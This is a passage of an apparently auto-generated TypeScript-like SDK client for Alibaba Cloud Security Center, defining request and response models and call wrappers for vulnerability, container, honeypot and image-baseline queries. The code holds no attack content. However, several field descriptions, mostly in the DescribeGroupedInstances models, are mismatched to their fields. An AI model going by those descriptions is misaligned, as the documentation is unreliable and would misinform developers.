    action = 'DescribeFrontVulPatchList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeFrontVulPatchList(request: DescribeFrontVulPatchListRequest): DescribeFrontVulPatchListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeFrontVulPatchListWithOptions(request, runtime);
}

model DescribeGroupStructRequest {
  lang?: string(name='Lang', example='zh'),
}

model DescribeGroupStructResponseBody = {
  groupFather?: int32(name='GroupFather', example='958****'),
  groupFlag?: int32(name='GroupFlag', example='0'),
  groupId?: long(name='GroupId', example='958****'),
  groupIndex?: int32(name='GroupIndex', example='1'),
  groupLevel?: int32(name='GroupLevel', example='2'),
  groupName?: string(name='GroupName', example='TestGroupName'),
  groups?: [ string ](name='Groups'),
  machineNum?: int32(name='MachineNum', example='30'),
  requestId?: string(name='RequestId', example='9FBC6E47-7508-58C9-9E76-528E118C****'),
}

model DescribeGroupStructResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupStructResponseBody(name='body'),
}

async function describeGroupStructWithOptions(request: DescribeGroupStructRequest, runtime: Util.RuntimeOptions): DescribeGroupStructResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupStruct',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeGroupStruct(request: DescribeGroupStructRequest): DescribeGroupStructResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupStructWithOptions(request, runtime);
}

model DescribeGroupedContainerInstancesRequest {
  criteria?: string(name='Criteria', example='[{"name":"riskStatus","value":"YES"},{"name":"riskLevel","value":"2"}]'),
  currentPage?: int32(name='CurrentPage', example='1'),
  fieldValue?: string(name='FieldValue', example='cas-adad-qeqwe'),
  groupField?: string(name='GroupField', example='pod'),
  logicalExp?: string(name='LogicalExp', example='OR'),
  pageSize?: int32(name='PageSize', example='20'),
}

model DescribeGroupedContainerInstancesResponseBody = {
  groupedContainerInstanceList?: [ 
    {
      alarmCount?: int32(name='AlarmCount', example='1'),
      appName?: string(name='AppName', example='oss-liveness-probe'),
      clusterId?: string(name='ClusterId', example='cf3824769c85441b4bf3****'),
      clusterName?: string(name='ClusterName', example='test'),
      clusterType?: string(name='ClusterType', example='ManagedKubernetes'),
      createTime?: long(name='CreateTime', example='1600076893000'),
      custerState?: string(name='CusterState', example='running'),
      hcCount?: int32(name='HcCount', example='20'),
      hostIp?: string(name='HostIp', example='172.114.XX.XX'),
      image?: string(name='Image', example='registry-vpc.ap-southeast-5.aliyuncs.com/log-service-release/sls-connector:1.1.77'),
      imageDigest?: string(name='ImageDigest', example='58e58c013f70bbfde140c8a55c1078074b3483479428d4069aa946827fd566cf'),
      imageRepoName?: string(name='ImageRepoName', example='test-003'),
      imageRepoNamespace?: string(name='ImageRepoNamespace', example='name001'),
      imageRepoTag?: string(name='ImageRepoTag', example='dev-20220512-2'),
      imageUuid?: string(name='ImageUuid', example='e4bdec1d9ba7e0967111a7ea467c****'),
      instanceCount?: int32(name='InstanceCount', example='9'),
      instanceId?: string(name='InstanceId', example='i-8vb9ul5xec4tua4q****'),
      namespace?: string(name='Namespace', example='kube-system'),
      pod?: string(name='Pod', example='csi-plugin-2n****'),
      podIp?: string(name='PodIp', example='172.114.XX.XX'),
      regionId?: string(name='RegionId', example='cn-hangzhou'),
      riskInstanceCount?: int32(name='RiskInstanceCount', example='1'),
      riskLevel?: string(name='RiskLevel', example='low'),
      riskStatus?: string(name='RiskStatus', example='NO'),
      vulCount?: int32(name='VulCount', example='1'),
    }
  ](name='GroupedContainerInstanceList'),
  pageInfo?: {
    count?: int32(name='Count', example='20'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='25'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='4E5BFDCF-B9DD-430D-9DA4-151BCB581C9D'),
}

model DescribeGroupedContainerInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupedContainerInstancesResponseBody(name='body'),
}

async function describeGroupedContainerInstancesWithOptions(request: DescribeGroupedContainerInstancesRequest, runtime: Util.RuntimeOptions): DescribeGroupedContainerInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.groupField)) {
    query['GroupField'] = request.groupField;
  }
  if (!Util.isUnset(request.logicalExp)) {
    query['LogicalExp'] = request.logicalExp;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupedContainerInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeGroupedContainerInstances(request: DescribeGroupedContainerInstancesRequest): DescribeGroupedContainerInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupedContainerInstancesWithOptions(request, runtime);
}

model DescribeGroupedInstancesRequest {
  currentPage?: int32(name='CurrentPage', description='The number of entries to return on each page. Default value: **20**.', example='1'),
  fieldValue?: string(name='FieldValue', description='The pagination information.', example='test-01'),
  groupField?: string(name='GroupField', description='An array that consists of the information about the assets.', example='groupId'),
  lang?: string(name='Lang', description='The number of entries returned on the current page.', example='zh'),
  machineTypes?: string(name='MachineTypes', description='Specifies whether to enable paged query. Default value: **true**. Valid values:

*   **true**: yes
*   **false**: no', example='ecs'),
  noPage?: boolean(name='NoPage', description='The number of assets on which high-risk vulnerabilities are detected.', example='true'),
  pageSize?: int32(name='PageSize', description='The type of the server group. Valid values:

*   **0**: the default group
*   **1**: other group', example='20'),
  saleVersionCheckCode?: string(name='SaleVersionCheckCode', example='sas_gt_basic'),
  vendor?: int32(name='Vendor', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='0'),
  vendors?: string(name='Vendors', description='The name of the group to which the assets belong. Fuzzy search is supported.', example='0,8'),
}

model DescribeGroupedInstancesResponseBody = {
  instances?: [ 
    {
      asapVulInstanceCount?: long(name='AsapVulInstanceCount', example='11'),
      authVersionCheckCount?: int32(name='AuthVersionCheckCount', example='205'),
      fieldAliasName?: string(name='FieldAliasName', example='testA'),
      groupFlag?: int32(name='GroupFlag', example='1'),
      instanceCount?: string(name='InstanceCount', example='205'),
      riskInstanceCount?: string(name='RiskInstanceCount', example='172'),
      unProtectedInstanceCount?: string(name='UnProtectedInstanceCount', example='32'),
    }
  ](name='Instances'),
  pageInfo?: {
    count?: int32(name='Count', description='58928', example='20'),
    currentPage?: int32(name='CurrentPage', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5'),
    pageSize?: int32(name='PageSize', description='Queries the statistical information about assets based on a specified filter condition.', example='20'),
    totalCount?: int32(name='TotalCount', description='DescribeGroupedInstances', example='100'),
  }(name='PageInfo', description='The number of assets that are not protected by Security Center.'),
  requestId?: string(name='RequestId', description='The name of the server group.', example='52A3AEE6-114A-499D-8990-4BA9B27FE0AA'),
}

model DescribeGroupedInstancesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupedInstancesResponseBody(name='body'),
}

async function describeGroupedInstancesWithOptions(request: DescribeGroupedInstancesRequest, runtime: Util.RuntimeOptions): DescribeGroupedInstancesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.fieldValue)) {
    query['FieldValue'] = request.fieldValue;
  }
  if (!Util.isUnset(request.groupField)) {
    query['GroupField'] = request.groupField;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  if (!Util.isUnset(request.noPage)) {
    query['NoPage'] = request.noPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.saleVersionCheckCode)) {
    query['SaleVersionCheckCode'] = request.saleVersionCheckCode;
  }
  if (!Util.isUnset(request.vendor)) {
    query['Vendor'] = request.vendor;
  }
  if (!Util.isUnset(request.vendors)) {
    query['Vendors'] = request.vendors;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupedInstances',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeGroupedInstances(request: DescribeGroupedInstancesRequest): DescribeGroupedInstancesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupedInstancesWithOptions(request, runtime);
}

model DescribeGroupedMaliciousFilesRequest {
  clusterId?: string(name='ClusterId', example='c556c8133b5ad4378b7fc533ddbda****'),
  currentPage?: int32(name='CurrentPage', example='1'),
  fuzzyMaliciousName?: string(name='FuzzyMaliciousName', example='Mining'),
  imageDigest?: string(name='ImageDigest', example='6a5e103187b31a94592a47a5858617f7****'),
  imageLayer?: string(name='ImageLayer', example='27213ad375b53628dd152a5ca****'),
  imageTag?: string(name='ImageTag', example='0.2'),
  lang?: string(name='Lang', example='zh'),
  levels?: string(name='Levels', example='serious'),
  maliciousMd5?: string(name='MaliciousMd5', example='d836968041f7683b5459****'),
  pageSize?: string(name='PageSize', example='20'),
  repoId?: string(name='RepoId', example='crr-vridcl4****'),
  repoInstanceId?: string(name='RepoInstanceId', example='cri-datvailb****'),
  repoName?: string(name='RepoName', example='centos'),
  repoNamespace?: string(name='RepoNamespace', example='hanghai-namespace'),
  repoRegionId?: string(name='RepoRegionId', example='cn-shanghai'),
  scanRange?: [ string ](name='ScanRange'),
}

model DescribeGroupedMaliciousFilesResponseBody = {
  groupedMaliciousFileResponse?: [ 
    {
      firstScanTimestamp?: long(name='FirstScanTimestamp', example='1594907349000'),
      imageCount?: long(name='ImageCount', example='3'),
      latestScanTimestamp?: long(name='LatestScanTimestamp', example='1596533942000'),
      level?: string(name='Level', example='serious'),
      maliciousMd5?: string(name='MaliciousMd5', example='d836968041f7683b5459****'),
      maliciousName?: string(name='MaliciousName', example='testFile'),
      status?: int32(name='Status', example='0'),
    }
  ](name='GroupedMaliciousFileResponse'),
  pageInfo?: {
    count?: int32(name='Count', example='2'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='2'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='8045E03E-6D91-4C53-9F22-5A1B84BB29D9'),
}

model DescribeGroupedMaliciousFilesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupedMaliciousFilesResponseBody(name='body'),
}

async function describeGroupedMaliciousFilesWithOptions(request: DescribeGroupedMaliciousFilesRequest, runtime: Util.RuntimeOptions): DescribeGroupedMaliciousFilesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.fuzzyMaliciousName)) {
    query['FuzzyMaliciousName'] = request.fuzzyMaliciousName;
  }
  if (!Util.isUnset(request.imageDigest)) {
    query['ImageDigest'] = request.imageDigest;
  }
  if (!Util.isUnset(request.imageLayer)) {
    query['ImageLayer'] = request.imageLayer;
  }
  if (!Util.isUnset(request.imageTag)) {
    query['ImageTag'] = request.imageTag;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.maliciousMd5)) {
    query['MaliciousMd5'] = request.maliciousMd5;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.repoRegionId)) {
    query['RepoRegionId'] = request.repoRegionId;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupedMaliciousFiles',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeGroupedMaliciousFiles(request: DescribeGroupedMaliciousFilesRequest): DescribeGroupedMaliciousFilesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupedMaliciousFilesWithOptions(request, runtime);
}

model DescribeGroupedTagsRequest {
  machineTypes?: string(name='MachineTypes', description='ecs', example='ecs'),
}

model DescribeGroupedTagsResponseBody = {
  count?: int32(name='Count', example='0'),
  groupedFileds?: [ 
    {
      count?: string(name='Count', example='152'),
      name?: string(name='Name', example='InternetIp'),
      tagId?: int32(name='TagId', example='3252366'),
    }
  ](name='GroupedFileds'),
  httpStatusCode?: int32(name='HttpStatusCode', description='This parameter is deprecated.', example='200'),
  requestId?: string(name='RequestId', description='Queries the statistics of asset tags.', example='151F6EB6-D5F3-417A-AF7B-4D84975DB586'),
  success?: boolean(name='Success', description='DescribeGroupedTags', example='true'),
}

model DescribeGroupedTagsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupedTagsResponseBody(name='body'),
}

async function describeGroupedTagsWithOptions(request: DescribeGroupedTagsRequest, runtime: Util.RuntimeOptions): DescribeGroupedTagsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupedTags',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeGroupedTags(request: DescribeGroupedTagsRequest): DescribeGroupedTagsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupedTagsWithOptions(request, runtime);
}

model DescribeGroupedVulRequest {
  aliasName?: string(name='AliasName', example='RHSA-2019:0230-Important: polkit security update'),
  assetType?: string(name='AssetType', example='ECS,CONTAINER'),
  attachTypes?: string(name='AttachTypes', example='sca'),
  containerFieldName?: string(name='ContainerFieldName', example='appName'),
  currentPage?: int32(name='CurrentPage', example='1'),
  dealed?: string(name='Dealed', example='n'),
  groupId?: string(name='GroupId', example='235454'),
  lang?: string(name='Lang', description='The name of the vulnerability.', example='zh'),
  necessity?: string(name='Necessity', example='asap,later,nntf'),
  pageSize?: int32(name='PageSize', example='20'),
  searchTags?: string(name='SearchTags', example='Code Execution'),
  targetType?: string(name='TargetType', example='containerId'),
  type?: string(name='Type', description='The total number of fixed vulnerabilities.', example='cve'),
  uuids?: string(name='Uuids', description='The number of vulnerabilities that have the **high** priority.', example='d42f938c-d962-48a0-90f9-05e4ea****'),
}

model DescribeGroupedVulResponseBody = {
  currentPage?: int32(name='CurrentPage', example='1'),
  groupedVulItems?: [ 
    {
      aliasName?: string(name='AliasName', example='RHSA-2017:0184-Important: mysql security update'),
      asapCount?: int32(name='AsapCount', example='0'),
      gmtLast?: long(name='GmtLast', example='1639371446000'),
      handledCount?: int32(name='HandledCount', example='0'),
      laterCount?: int32(name='LaterCount', example='0'),
      name?: string(name='Name', example='oval:com.redhat.rhsa:def:20170184'),
      nntfCount?: int32(name='NntfCount', example='59'),
      raspDefend?: int32(name='RaspDefend', description='支持RASP实时防护，取值：
- **0**：不支持
- **1**：支持
> 无该属性也表示不支持。', example='1'),
      tags?: string(name='Tags', example='Code Execution'),
      totalFixCount?: long(name='TotalFixCount', example='0'),
      type?: string(name='Type', example='cve'),
    }
  ](name='GroupedVulItems'),
  pageSize?: int32(name='PageSize', example='20'),
  requestId?: string(name='RequestId', example='9BFA6D78-07EA-5C0A-9358-E4434573507B'),
  totalCount?: int32(name='TotalCount', example='1'),
}

model DescribeGroupedVulResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupedVulResponseBody(name='body'),
}

async function describeGroupedVulWithOptions(request: DescribeGroupedVulRequest, runtime: Util.RuntimeOptions): DescribeGroupedVulResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.assetType)) {
    query['AssetType'] = request.assetType;
  }
  if (!Util.isUnset(request.attachTypes)) {
    query['AttachTypes'] = request.attachTypes;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.searchTags)) {
    query['SearchTags'] = request.searchTags;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupedVul',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeGroupedVul(request: DescribeGroupedVulRequest): DescribeGroupedVulResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupedVulWithOptions(request, runtime);
}

model DescribeHcExportInfoRequest {
  exportId?: long(name='ExportId', example='443285'),
}

model DescribeHcExportInfoResponseBody = {
  currentCount?: int32(name='CurrentCount', example='148'),
  fileName?: string(name='FileName', example='health_check_export_2022****'),
  gmtCreate?: long(name='GmtCreate', example='2022-11-03T15:15Z'),
  id?: long(name='Id', example='1082278'),
  link?: string(name='Link', example='https://hc-export.oss-cn-shanghai.aliyuncs.com/export_hc/health_check_export_20221222_1671699255808.zip?Expires=1672304056&OSSAccessKeyId=****&Signature=****'),
  progress?: int32(name='Progress', example='89'),
  requestId?: string(name='RequestId', example='3C2C94CF-ED08-50C0-BC72-C5029251****'),
  resultStatus?: string(name='ResultStatus', example='exporting'),
  totalCount?: int32(name='TotalCount', example='624'),
}

model DescribeHcExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeHcExportInfoResponseBody(name='body'),
}

async function describeHcExportInfoWithOptions(request: DescribeHcExportInfoRequest, runtime: Util.RuntimeOptions): DescribeHcExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportId)) {
    query['ExportId'] = request.exportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeHcExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeHcExportInfo(request: DescribeHcExportInfoRequest): DescribeHcExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeHcExportInfoWithOptions(request, runtime);
}

model DescribeHoneyPotAuthRequest {
  lang?: string(name='Lang', example='zh'),
}

model DescribeHoneyPotAuthResponseBody = {
  honeyPotAuthCount?: long(name='HoneyPotAuthCount', example='10'),
  honeyPotCount?: int32(name='HoneyPotCount', example='4'),
  requestId?: string(name='RequestId', example='0F5023B6-9C1F-459F-ACCC-8B4636804037'),
}

model DescribeHoneyPotAuthResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeHoneyPotAuthResponseBody(name='body'),
}

async function describeHoneyPotAuthWithOptions(request: DescribeHoneyPotAuthRequest, runtime: Util.RuntimeOptions): DescribeHoneyPotAuthResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeHoneyPotAuth',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeHoneyPotAuth(request: DescribeHoneyPotAuthRequest): DescribeHoneyPotAuthResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeHoneyPotAuthWithOptions(request, runtime);
}

model DescribeHoneyPotSuspStatisticsRequest {
  from?: string(name='From', example='honeypot'),
  lang?: string(name='Lang', example='zh'),
  statisticsDays?: int32(name='StatisticsDays', example='30'),
  statisticsKeyType?: string(name='StatisticsKeyType', example='vpcInstanceId'),
}

model DescribeHoneyPotSuspStatisticsResponseBody = {
  requestId?: string(name='RequestId', example='9E3969FA-5ACC-4256-9FDE-BB6918CD0410'),
  suspHoneyPotStatisticsResponse?: [ 
    {
      count?: int32(name='Count', example='8793'),
      instanceId?: string(name='InstanceId', example='i-p0whhoba24wd28p8****'),
      instanceName?: string(name='InstanceName', example='abc-launch-advisor'),
      type?: string(name='Type', example='vpcInstanceId'),
      vpcId?: string(name='VpcId', example='vpc-p0wwdsuutdyu1ygkt****'),
      vpcName?: string(name='VpcName', example='abc01'),
    }
  ](name='SuspHoneyPotStatisticsResponse'),
}

model DescribeHoneyPotSuspStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeHoneyPotSuspStatisticsResponseBody(name='body'),
}

async function describeHoneyPotSuspStatisticsWithOptions(request: DescribeHoneyPotSuspStatisticsRequest, runtime: Util.RuntimeOptions): DescribeHoneyPotSuspStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.statisticsDays)) {
    query['StatisticsDays'] = request.statisticsDays;
  }
  if (!Util.isUnset(request.statisticsKeyType)) {
    query['StatisticsKeyType'] = request.statisticsKeyType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeHoneyPotSuspStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeHoneyPotSuspStatistics(request: DescribeHoneyPotSuspStatisticsRequest): DescribeHoneyPotSuspStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeHoneyPotSuspStatisticsWithOptions(request, runtime);
}

model DescribeImageRequest {
  imageInstanceId?: string(name='ImageInstanceId', description='The instance ID of the image.

>  You can call the [DescribeImageInstances](~~DescribeImageInstances~~) operation to query the IDs of instances.', example='cri-hfs6gaawhyu6****'),
  imageRegionId?: string(name='ImageRegionId', description='The region ID of the image.

>  You can call the [DescribeImageInstances](~~DescribeImageInstances~~) operation to query the IDs of regions.', example='cn-hangzhou'),
  imageRepoId?: string(name='ImageRepoId', description='The ID of the image repository.

>  You can call the [DescribeImageInstances](~~DescribeImageInstances~~) operation to query the IDs of image repositories.', example='crr-7i88t7lx3fmf****'),
  imageTag?: string(name='ImageTag', description='The tag that is added to the image.

>  You can call the [DescribeImageInstances](~~DescribeImageInstances~~) operation to query tags.', example='1.8.0.15'),
}

model DescribeImageResponseBody = {
  data?: {
    digest?: string(name='Digest', description='The digest value of the image.', example='0afb98d97f1a4030782fcf47e186909e5ad957bcc182d8be70334e0684b2****'),
  }(name='Data', description='The information about the image digest.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeImageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageResponseBody(name='body'),
}

async function describeImageWithOptions(request: DescribeImageRequest, runtime: Util.RuntimeOptions): DescribeImageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.imageInstanceId)) {
    query['ImageInstanceId'] = request.imageInstanceId;
  }
  if (!Util.isUnset(request.imageRegionId)) {
    query['ImageRegionId'] = request.imageRegionId;
  }
  if (!Util.isUnset(request.imageRepoId)) {
    query['ImageRepoId'] = request.imageRepoId;
  }
  if (!Util.isUnset(request.imageTag)) {
    query['ImageTag'] = request.imageTag;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImage(request: DescribeImageRequest): DescribeImageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageWithOptions(request, runtime);
}

model DescribeImageBaselineCheckResultRequest {
  criteria?: string(name='Criteria', example='ak_leak'),
  criteriaType?: string(name='CriteriaType', example='BaselineNameAlias'),
  currentPage?: int32(name='CurrentPage', example='1'),
  imageUuid?: string(name='ImageUuid', example='a910053dd4710173ecc9e9d8931f****'),
  lang?: string(name='Lang', example='zh'),
  pageSize?: int32(name='PageSize', example='20'),
  riskLevel?: string(name='RiskLevel', example='high,medium,low'),
  scanRange?: [ string ](name='ScanRange'),
}

model DescribeImageBaselineCheckResultResponseBody = {
  baselineResult?: [ 
    {
      baselineClassAlias?: string(name='BaselineClassAlias', example='identification'),
      baselineItemCount?: int32(name='BaselineItemCount', example='5'),
      baselineNameAlias?: string(name='BaselineNameAlias'),
      baselineNameKey?: string(name='BaselineNameKey', example='identification'),
      baselineNameLevel?: string(name='BaselineNameLevel', example='high'),
      firstScanTime?: long(name='FirstScanTime', example='1610304058366'),
      highRiskItemCount?: int32(name='HighRiskItemCount', example='1'),
      lastScanTime?: long(name='LastScanTime', example='1610304058301'),
      lowRiskItemCount?: int32(name='LowRiskItemCount', example='10'),
      middleRiskItemCount?: int32(name='MiddleRiskItemCount', example='1'),
      status?: int32(name='Status', example='1'),
    }
  ](name='BaselineResult'),
  pageInfo?: {
    count?: int32(name='Count', example='10'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='100'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='24A20733-10A0-4AF6-BE6B-E3322413****'),
}

model DescribeImageBaselineCheckResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageBaselineCheckResultResponseBody(name='body'),
}

async function describeImageBaselineCheckResultWithOptions(request: DescribeImageBaselineCheckResultRequest, runtime: Util.RuntimeOptions): DescribeImageBaselineCheckResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
